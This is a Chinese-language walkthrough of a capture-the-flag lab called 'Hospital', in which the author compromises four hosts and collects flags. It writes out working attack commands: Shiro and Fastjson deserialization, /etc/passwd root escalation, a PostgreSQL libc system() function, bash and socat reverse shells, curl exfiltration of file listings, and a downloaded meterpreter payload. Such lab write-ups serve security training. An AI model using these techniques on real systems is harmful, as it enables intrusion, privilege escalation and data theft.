---
typora-root-url: 春秋云境Hospital
title: 春秋云境Hospital
toc: true
categories:
  - 渗透测试
date: 2026-03-16 22:15:08
tags: 
  - 渗透测试
---

# 春秋云境Hospital

fscan扫描

```
E:\Users\tiand>fscan -h 39.98.126.86 -p 1-65535
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.1

[789ms]     已选择服务扫描模式
[789ms]     开始信息扫描
[789ms]     最终有效主机数量: 1
[789ms]     开始主机扫描
[789ms]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle
[795ms]     有效端口数量: 65535
[904ms] [*] 端口开放 39.98.126.86:22
[33.9s] [*] 端口开放 39.98.126.86:8080
[4m36s]     扫描完成, 发现 2 个开放端口
[4m36s]     存活端口数量: 2
[4m36s]     开始漏洞扫描
[4m36s]     POC加载完成: 总共387个，成功387个，失败0个
[4m37s] [*] 网站标题 http://39.98.126.86:8080  状态码:302 长度:0      标题:无标题 重定向地址: http://39.98.126.86:8080/login;jsessionid=06C3AC40F565CD32173E22DB4275691E
[4m38s] [*] 网站标题 http://39.98.126.86:8080/login;jsessionid=06C3AC40F565CD32173E22DB4275691E 状态码:200 长度:2005   标题:医疗管理后台
```

## shiro

8080弱口令 admin:admin123进入

cookie里有rememberMe

而且，目录扫描有/actuator/heapdump

```
└─$ dirsearch -u http://39.98.126.86:8080/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11461

Output File: /mnt/e/Users/tiand/reports/http_39.98.126.86_8080/__26-03-16_09-36-44.txt

Target: http://39.98.126.86:8080/

[09:36:44] Starting:
[09:36:53] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[09:36:54] 400 -  435B  - /a%5c.aspx
[09:36:55] 200 -    1KB - /actuator
[09:36:55] 200 -   20B  - /actuator/;/caches
[09:36:55] 404 -  136B  - /actuator/;/dump
[09:36:55] 404 -  139B  - /actuator/;/logfile
[09:36:55] 404 -  143B  - /actuator/;/auditevents
[09:36:55] 404 -  148B  - /actuator/;/integrationgraph
[09:36:55] 404 -  138B  - /actuator/;/events
[09:36:55] 404 -  135B  - /actuator/;/env
[09:36:55] 404 -  140B  - /actuator/;/auditLog
[09:36:55] 404 -  140B  - /actuator/;/features
[09:36:55] 404 -  156B  - /actuator/;/exportRegisteredServices
[09:36:55] 404 -  141B  - /actuator/;/liquibase
[09:36:55] 404 -  138B  - /actuator/;/flyway
[09:36:55] 404 -  153B  - /actuator/;/configurationMetadata
[09:36:55] 404 -  141B  - /actuator/;/httptrace
[09:36:55] 200 -   74KB - /actuator/;/beans
[09:36:55] 404 -  139B  - /actuator/;/jolokia
[09:36:55] 404 -  145B  - /actuator/;/loggingConfig
[09:36:55] 404 -  143B  - /actuator/;/healthcheck
[09:36:55] 404 -  149B  - /actuator/;/resolveAttributes
[09:36:55] 200 -  749B  - /actuator/;/metrics
[09:36:55] 404 -  140B  - /actuator/;/sessions
[09:36:55] 404 -  139B  - /actuator/;/refresh
[09:36:55] 404 -  149B  - /actuator/;/releaseAttributes
[09:36:55] 404 -  138B  - /actuator/;/status
[09:36:55] 404 -  142B  - /actuator/;/prometheus
[09:36:55] 404 -  143B  - /actuator/;/ssoSessions
[09:36:55] 404 -  138B  - /actuator/auditLog
[09:36:55] 404 -  141B  - /actuator/auditevents
[09:36:55] 404 -  135B  - /actuator/;/sso
[09:36:55] 200 -   20KB - /actuator/;/mappings
[09:36:55] 200 -    2B  - /actuator/;/info
[09:36:55] 404 -  150B  - /actuator/;/registeredServices
[09:36:55] 200 -   93KB - /actuator/;/conditions
[09:36:55] 404 -  140B  - /actuator/;/shutdown
[09:36:55] 404 -  137B  - /actuator/;/trace
[09:36:55] 404 -  142B  - /actuator/;/statistics
[09:36:55] 404 -  145B  - /actuator/;/springWebflow
[09:36:55] 200 -   15B  - /actuator/;/health
[09:36:55] 200 -   20B  - /actuator/caches
[09:36:55] 200 -   54B  - /actuator/;/scheduledtasks
[09:36:55] 404 -  154B  - /actuator/exportRegisteredServices
[09:36:55] 404 -  133B  - /actuator/env
[09:36:55] 404 -  136B  - /actuator/events
[09:36:55] 404 -  136B  - /actuator/flyway
[09:36:55] 404 -  134B  - /actuator/dump
[09:36:55] 200 -   15B  - /actuator/health
[09:36:55] 404 -  141B  - /actuator/healthcheck
[09:36:55] 404 -  144B  - /actuator/gateway/routes
[09:36:55] 200 -   93KB - /actuator/conditions
[09:36:55] 404 -  139B  - /actuator/httptrace
[09:36:55] 200 -   74KB - /actuator/beans
[09:36:55] 200 -   54KB - /actuator/;/loggers
[09:36:56] 404 -  138B  - /actuator/features
[09:36:56] 200 -    2B  - /actuator/info
[09:36:56] 404 -  140B  - /actuator/management
[09:36:56] 404 -  147B  - /actuator/releaseAttributes
[09:36:56] 200 -   54B  - /actuator/scheduledtasks
[09:36:56] 404 -  143B  - /actuator/loggingConfig
[09:36:56] 404 -  148B  - /actuator/registeredServices
[09:36:56] 404 -  140B  - /actuator/prometheus
[09:36:56] 200 -  749B  - /actuator/metrics
[09:36:56] 404 -  137B  - /actuator/jolokia
[09:36:56] 404 -  137B  - /actuator/logfile
[09:36:56] 404 -  138B  - /actuator/sessions
[09:36:56] 200 -   54KB - /actuator/loggers
[09:36:56] 404 -  137B  - /actuator/refresh
[09:36:56] 404 -  144B  - /actuator/hystrix.stream
[09:36:56] 404 -  147B  - /actuator/resolveAttributes
[09:36:56] 404 -  139B  - /actuator/liquibase
[09:36:56] 404 -  146B  - /actuator/integrationgraph
[09:36:56] 404 -  151B  - /actuator/configurationMetadata
[09:36:56] 200 -   20KB - /actuator/mappings
[09:36:56] 404 -  138B  - /actuator/shutdown
[09:36:56] 200 -    8KB - /actuator/;/configprops
[09:36:56] 200 -  130KB - /actuator/;/threaddump
[09:36:56] 200 -    8KB - /actuator/configprops
[09:36:56] 404 -  141B  - /actuator/ssoSessions
[09:36:56] 404 -  133B  - /actuator/sso
[09:36:56] 404 -  140B  - /actuator/statistics
[09:36:56] 404 -  136B  - /actuator/status
[09:36:56] 404 -  143B  - /actuator/springWebflow
[09:36:56] 404 -  135B  - /actuator/trace
[09:36:56] 200 -  100KB - /actuator/threaddump
[09:36:57] 200 -   35MB - /actuator/heapdump
[09:36:57] 200 -   34MB - /actuator/;/heapdump
[09:37:15] 404 -  132B  - /favicon.ico
[09:37:19] 404 -  127B  - /images
[09:37:19] 404 -  135B  - /images/Sym.php
[09:37:19] 404 -  134B  - /images/README
[09:37:19] 404 -  128B  - /images/
[09:37:19] 404 -  135B  - /images/c99.php
[09:37:22] 200 -    2KB - /login
```

尝试打shiro反序列化

```
E:\exploit\tools>java8 -jar heapdump_tool.jar  "D:\download\heapdump"
[-] file: D:\download\heapdump
[-] Start jhat, waiting...
[-] fing object count: 57450
[-] too many object,please input 0/1 to choose mode.
0. (search data, may can't find some data, can't use function num=,len=,getip,geturl,getfile).
1. (load all object, need wait a few minutes).
> 0
[-] please input keyword value to search, example: password,re=xxx,len=16,num=0-10,id=0x123a,class=org.xx,all=true,geturl,getfile,getip,shirokey,systemproperties,allproperties,hashtable input q/quit to quit.
> shirokey
>> GGAysjAQhG7/sDKQlVpR2g==
[-] please input keyword value to search, example: password,re=xxx,len=16,num=0-10,id=0x123a,class=org.xx,all=true,geturl,getfile,getip,shirokey,systemproperties,allproperties,hashtable input q/quit to quit.
```

md这个密钥错的，不指道是不是heapdump_tool的原因（666）

```
D:\download>java8 -jar JDumpSpider-1.1-SNAPSHOT-full.jar
please give a heap filepath.

D:\download>java8 -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump
===========================================
SpringDataSourceProperties
-------------
not found!

===========================================
WeblogicDataSourceConnectionPoolConfig
-------------
not found!

===========================================
MongoClient
-------------
not found!

===========================================
AliDruidDataSourceWrapper
-------------
not found!

===========================================
HikariDataSource
-------------
not found!

===========================================
RedisStandaloneConfiguration
-------------
not found!

===========================================
JedisClient
-------------
not found!

===========================================
CookieRememberMeManager(ShiroKey)
-------------
algMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES
```

打内存马

![image-20260316102243895](image-20260316102243895.png)

### suid提权

```
/home/app/ >find / -perm -4000 -type f 2>/dev/null
/usr/bin/vim.basic
/usr/bin/su
/usr/bin/newgrp
/usr/bin/staprun
/usr/bin/at
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/stapbpf
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/mount
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
```

vim要交互式shell

socat交互式shell

```
socat file:`tty`,raw,echo=0 tcp-listen:4444
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane

```

### /etc/passwd提权

openssl生成hash改/etc/passwd

```
└─$ openssl passwd -1 -salt admin admin
$1$admin$1kgWpnZpUx.vTroWPXPIB0

┌──(xiaotian㉿xiaotian)-[/mnt/c/Users/tiand]
└─$ echo 'admin:$1$admin$1kgWpnZpUx.vTroWPXPIB0:0:0:,,,:/home/admin:/bin/bash'
admin:$1$admin$1kgWpnZpUx.vTroWPXPIB0:0:0:,,,:/home/admin:/bin/bash
```



```
app@web01:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:106:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:107:113::/nonexistent:/usr/sbin/nologin
ntp:x:108:115::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
_chrony:x:110:121:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
app:x:1000:1000::/home/app:/bin/bash
admin:$1$admin$1kgWpnZpUx.vTroWPXPIB0:0:0:,,,:/home/admin:/bin/bash
app@web01:~$ su admin
Password:
root@web01:/home/app# whoami
root
root@web01:/home/app# ls /root
flag
root@web01:/home/app# cat /root/flag/flag01.txt
O))     O))                              O))             O))
O))     O))                          O)  O))             O))
O))     O))   O))     O)))) O) O))     O)O) O)   O))     O))
O)))))) O)) O))  O)) O))    O)  O)) O))  O))   O))  O))  O))
O))     O))O))    O))  O))) O)   O))O))  O))  O))   O))  O))
O))     O)) O))  O))     O))O)) O)) O))  O))  O))   O))  O))
O))     O))   O))    O)) O))O))     O))   O))   O)) O)))O)))
                            O))
flag01: flag{46b48e89-c379-4103-8a58-b6a7da54878c}
```

### ssh公钥提权

或者写root的ssh公钥

```
ssh-keygen -t rsa
```

.pub公钥写入/root/.ssh/authorized_keys去ssh

传fscan扫内网并挂代理

```
root@web01:/tmp# ./fscan -h 172.30.12.5/24

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
(icmp) Target 172.30.12.5     is alive
(icmp) Target 172.30.12.6     is alive
(icmp) Target 172.30.12.236   is alive
[*] Icmp alive hosts len is: 3
172.30.12.6:8848 open
172.30.12.6:445 open
172.30.12.6:139 open
172.30.12.236:22 open
172.30.12.6:135 open
172.30.12.5:22 open
172.30.12.236:8009 open
172.30.12.236:8080 open
172.30.12.5:8080 open
[*] alive ports len is: 9
start vulscan
[*] NetInfo
[*]172.30.12.6
   [->]Server02
   [->]172.30.12.6
[*] NetBios 172.30.12.6     WORKGROUP\SERVER02
[*] WebTitle http://172.30.12.5:8080   code:302 len:0      title:None 跳转url: http://172.30.12.5:8080/login;jsessionid=B60FF94D3AB44851556D0CF505674563
[*] WebTitle http://172.30.12.5:8080/login;jsessionid=B60FF94D3AB44851556D0CF505674563 code:200 len:2005   title:医疗管理后台
[*] WebTitle http://172.30.12.236:8080 code:200 len:3964   title:医院后台管理平台
[*] WebTitle http://172.30.12.6:8848   code:404 len:431    title:HTTP Status 404 – Not Found
[+] PocScan http://172.30.12.5:8080 poc-yaml-spring-actuator-heapdump-file
[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos
[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos-v1-auth-bypass

172.30.12.5
172.30.12.6
172.30.12.236
```

## nacos

直接打nacos

![image-20260316204948859](image-20260316204948859.png)

```
C:/Users/Administrator/Desktop/nacos/bin/ >whoami
server02\administrator

C:/Users/Administrator/Desktop/nacos/bin/ >dir c:\ /S /B |findstr flag
c:\Users\Administrator\flag
c:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag.lnk
c:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag02.txt.lnk
c:\Users\Administrator\flag\flag02.txt

C:/Users/Administrator/Desktop/nacos/bin/ >type c:\Users\Administrator\flag\flag02.txt
88        88                                   88                    88  
88        88                                   ""   ,d               88  
88        88                                        88               88  
88aaaaaaaa88  ,adPPYba,  ,adPPYba, 8b,dPPYba,  88 MM88MMM ,adPPYYba, 88  
88""""""""88 a8"     "8a I8[    "" 88P'    "8a 88   88    ""     `Y8 88  
88        88 8b       d8  `"Y8ba,  88       d8 88   88    ,adPPPPP88 88  
88        88 "8a,   ,a8" aa    ]8I 88b,   ,a8" 88   88,   88,    ,88 88  
88        88  `"YbbdP"'  `"YbbdP"' 88`YbbdP"'  88   "Y888 `"8bbdP"Y8 88  
                                   88                                    
                                   88                                    
flag02: flag{bc64623b-a63a-411b-8b86-77b3be025c9a}
```

这里打 WebTitle http://172.30.12.236:8080 code:200 len:3964   title:医院后台管理平台卡了

## fastjson反序列化

一个单纯的登录界面，弱口令sql注入都试了，再其他机器找配置跟sql数据也没东西

看别人wp是fastjson反序列化，只接受json的服务可以尝试fastjson反序列化

burp利用插件https://github.com/amaz1ngday/fastjson-exp/

![image-20260316213929417](image-20260316213929417.png)

```
/ >whoami

root
/ >find / -name flag* -type f 2>/dev/null
/proc/sys/kernel/sched_domain/cpu0/domain0/flags
/proc/sys/kernel/sched_domain/cpu1/domain0/flags
/root/flag/flag03.txt
/ >cat /root/flag/flag03.txt

/$$   /$$                               /$$   /$$               /$$
| $$  | $$                              |__/  | $$              | $$
| $$  | $$  /$$$$$$   /$$$$$$$  /$$$$$$  /$$ /$$$$$$    /$$$$$$ | $$
| $$$$$$$$ /$$__  $$ /$$_____/ /$$__  $$| $$|_  $$_/   |____  $$| $$
| $$__  $$| $$  \ $$|  $$$$$$ | $$  \ $$| $$  | $$      /$$$$$$$| $$
| $$  | $$| $$  | $$ \____  $$| $$  | $$| $$  | $$ /$$ /$$__  $$| $$
| $$  | $$|  $$$$$$/ /$$$$$$$/| $$$$$$$/| $$  |  $$$$/|  $$$$$$$| $$
|__/  |__/ \______/ |_______/ | $$____/ |__/   \___/   \_______/|__/
                              | $$                                  
                              | $$                                  
                              |__/                                  
flag03: flag{f46558c0-dd7e-4e63-8e6d-e3b3f5ea5caf}
/ >ip addr

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:3c:c1:fb brd ff:ff:ff:ff:ff:ff
    inet 172.30.12.236/16 brd 172.30.255.255 scope global dynamic eth0
       valid_lft 1892153111sec preferred_lft 1892153111sec
    inet6 fe80::216:3eff:fe3c:c1fb/64 scope link 
       valid_lft forever preferred_lft forever
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:3c:c1:2c brd ff:ff:ff:ff:ff:ff
    inet 172.30.54.179/24 brd 172.30.54.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe3c:c12c/64 scope link 
       valid_lft forever preferred_lft forever
```

### 多级代理

发现双网卡，挂多级代理

```
/tmp >./fscan -h 172.30.54.179/24

Null
/tmp >cat re*

172.30.54.12:22 open
172.30.54.179:22 open
172.30.54.179:8080 open
172.30.54.12:5432 open
172.30.54.179:8009 open
172.30.54.12:3000 open
[*] WebTitle http://172.30.54.12:3000  code:302 len:29     title:None 跳转url: http://172.30.54.12:3000/login
[*] WebTitle http://172.30.54.179:8080 code:200 len:3964   title:医院后台管理平台
[*] WebTitle http://172.30.54.12:3000/login code:200 len:27909  title:Grafana

172.30.54.179
172.30.54.12
```

## Grafan

找到任意文件读

![image-20260316220146150](image-20260316220146150.png)

![image-20260316220410212](image-20260316220410212.png)

但是不知道怎么继续利用

找到工具https://github.com/A-D-Team/grafanaExp

 [A-D-Team/grafanaExp](https://github.com/A-D-Team/grafanaExp) 利用grafana CVE-2021-43798任意文件读漏洞，自动探测是否有漏洞、存在的plugin、提取密钥、解密server端db文件，并输出`data_sourrce`信息。

```
E:\exploit\tools>windows_amd64_grafanaExp.exe exp -u http://172.30.54.12:3000
2026/03/16 22:06:29 Target vulnerable has plugin [alertlist]
2026/03/16 22:06:29 Got secret_key [SW2YcwTIb9zpOOhoPsMm]
2026/03/16 22:06:29 There are [1] records in data_source table.
2026/03/16 22:06:29 type:[postgres]     name:[PostgreSQL]               url:[localhost:5432]    user:[postgres] password[Postgres@123]  database:[postgres]     basic_auth_user:[]      basic_auth_password:[]
remove C:\Users\tiand\AppData\Local\Temp\grafana3589579921: The process cannot access the file because it is being used by another process.
2026/03/16 22:06:29 All Done, have nice day!
```

## PostgreSQL

找到PostgreSQL账密直接mdut连接

![image-20260316221151181](image-20260316221151181.png)

失败了找不到.so，但是版本是能创建system的

`PostgreSQL <= 8.1` 可以通过调用系统的动态链接库 `libc.so.6` 来实现命令执行

系统上 libc.so.6 文件的路径只能靠试（位置不对创建函数时会报错的），一般为如下几个位置：

- `/lib/x86_64-linux-gnu/libc.so.6`

- `/lib/libc.so.6`

- `/lib64/libc.so.6`

- `/usr/lib/x86_64-linux-gnu/libc.so.6`

- `/usr/lib32/libc.so.6`

  创建函数成功后，执行命令时当返回值为 0 表示执行成功，其它值则是执行失败

不出网，从有权限机器监听或者做转发

```

E:\Users\tiand>psql  -h 172.30.54.12 -p 5432 -U postgres
用户 postgres 的口令：

psql (17.2, 服务器 8.1.0)
警告：psql 主版本17,服务器主版本为8.1.
     一些psql功能可能无法正常使用.
输入 "help" 来获取帮助信息.
postgres=# CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
CREATE FUNCTION
postgres=# select system('sh -i >& /dev/tcp/121.37.16.139/4444 0>&1');
 system
--------
    512
(1 行记录)
postgres=# select system('curl 172.30.54.179:4446/`ls|base64`');
```

```
(node 1) >> backward 4444 4444
[*] Trying to ask node to listen on 0.0.0.0:4444......
[*] Waiting for agent's response......
[*] Backward start successfully!
(node 1) >> backward 4446 4446
[*] Trying to ask node to listen on 0.0.0.0:4446......
[*] Waiting for agent's response......
[*] Backward start successfully!
```

```
E:\Users\tiand>ncat -lvvp 4446
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4446
Ncat: Listening on 0.0.0.0:4446
Ncat: Connection from 127.0.0.1:24040.
GET /YmFzZQpnbG9iYWwKcGdfY2xvZwpwZ19oYmEuY29uZgpwZ19pZGVudC5jb25mCnBnX211bHRpeGFj HTTP/1.1
Host: 172.30.54.179:4446
User-Agent: curl/7.68.0
Accept: */*

```

找不到flag，要提权，传个🐎

```
postgres=# select system('wget 172.30.54.179:4444/aaa;chmod +x aaa;./aaa');
```

```
E:\Users\tiand>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=172.30.54.179 LPORT=4446 -f elf -o aaa
```

```
msf exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf exploit(multi/handler) > options

Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf exploit(multi/handler) > set lport 4446
lport => 4446
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:4446
[*] Sending stage (1062760 bytes) to 127.0.0.1
[*] Meterpreter session 1 opened (127.0.0.1:4446 -> 127.0.0.1:64332) at 2026-03-16 23:05:20 +0800

meterpreter > shell
Process 3125 created.
Channel 1 created.
sudo -l
Matching Defaults entries for postgres on web04:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User postgres may run the following commands on web04:
    (ALL) NOPASSWD: /usr/local/postgresql/bin/psql
sudo  /usr/local/postgresql/bin/psql
Password: Postgres@123

psql: FATAL:  password authentication failed for user "root"
sudo  /usr/local/postgresql/bin/psql -U postgres
Password for user postgres: Postgres@123

\?
General
  \c[onnect] [DBNAME|- [USER]]
                 connect to new database (currently "postgres")
  \cd [DIR]      change the current working directory
  \copyright     show PostgreSQL usage and distribution terms
  \encoding [ENCODING]
                 show or set client encoding
  \h [NAME]      help on syntax of SQL commands, * for all commands
  \q             quit psql
  \set [NAME [VALUE]]
                 set internal variable, or list all if no parameters
  \timing        toggle timing of commands (currently off)
  \unset NAME    unset (delete) internal variable
  \! [COMMAND]   execute command in shell or start interactive shell

Query Buffer
  \e [FILE]      edit the query buffer (or file) with external editor
  \g [FILE]      send query buffer to server (and results to file or |pipe)
  \p             show the contents of the query buffer
  \r             reset (clear) the query buffer
  \w FILE        write query buffer to file

Input/Output
  \echo [STRING] write string to standard output
  \i FILE        execute commands from file
  \o [FILE]      send all query results to file or |pipe
  \qecho [STRING]
                 write string to query output stream (see \o)

Informational
  \d [NAME]      describe table, index, sequence, or view
  \d{t|i|s|v|S} [PATTERN] (add "+" for more detail)
                 list tables/indexes/sequences/views/system tables
  \da [PATTERN]  list aggregate functions
  \db [PATTERN]  list tablespaces (add "+" for more detail)
  \dc [PATTERN]  list conversions
  \dC            list casts
  \dd [PATTERN]  show comment for object
  \dD [PATTERN]  list domains
  \df [PATTERN]  list functions (add "+" for more detail)
  \dg [PATTERN]  list groups
  \dn [PATTERN]  list schemas (add "+" for more detail)
  \do [NAME]     list operators
  \dl            list large objects, same as \lo_list
  \dp [PATTERN]  list table, view, and sequence access privileges
  \dT [PATTERN]  list data types (add "+" for more detail)
  \du [PATTERN]  list users
  \l             list all databases (add "+" for more detail)
  \z [PATTERN]   list table, view, and sequence access privileges (same as \dp)

Formatting
  \a             toggle between unaligned and aligned output mode
  \C [STRING]    set table title, or unset if none
  \f [STRING]    show or set field separator for unaligned query output
  \H             toggle HTML output mode (currently off)
  \pset NAME [VALUE]
                 set table output option
                 (NAME := {format|border|expanded|fieldsep|footer|null|
                 numericlocale|recordsep|tuples_only|title|tableattr|pager})
  \t             show only rows (currently off)
  \T [STRING]    set HTML <table> tag attributes, or unset if none
  \x             toggle expanded output (currently off)

Copy, Large Object
  \copy ...      perform SQL COPY with data stream to the client host
  \lo_export LOBOID FILE
  \lo_import FILE [COMMENT]
  \lo_list
  \lo_unlink LOBOID    large object operations
\!whoami
root
\!bash
whoami
root
ls /root
flag
cat /root/flag/f*
                                           ,,                   ,,
`7MMF'  `7MMF'                             db   mm            `7MM
  MM      MM                                    MM              MM
  MM      MM  ,pW"Wq.  ,pP"Ybd `7MMpdMAo.`7MM mmMMmm  ,6"Yb.    MM
  MMmmmmmmMM 6W'   `Wb 8I   `"   MM   `Wb  MM   MM   8)   MM    MM
  MM      MM 8M     M8 `YMMMa.   MM    M8  MM   MM    ,pm9MM    MM
  MM      MM YA.   ,A9 L.   I8   MM   ,AP  MM   MM   8M   MM    MM
.JMML.  .JMML.`Ybmd9'  M9mmmP'   MMbmmd' .JMML. `Mbmo`Moo9^Yo..JMML.
                                 MM
                               .JMML.
flag04: flag{025de34a-753c-404d-9e2a-49b40ff269b0}
```

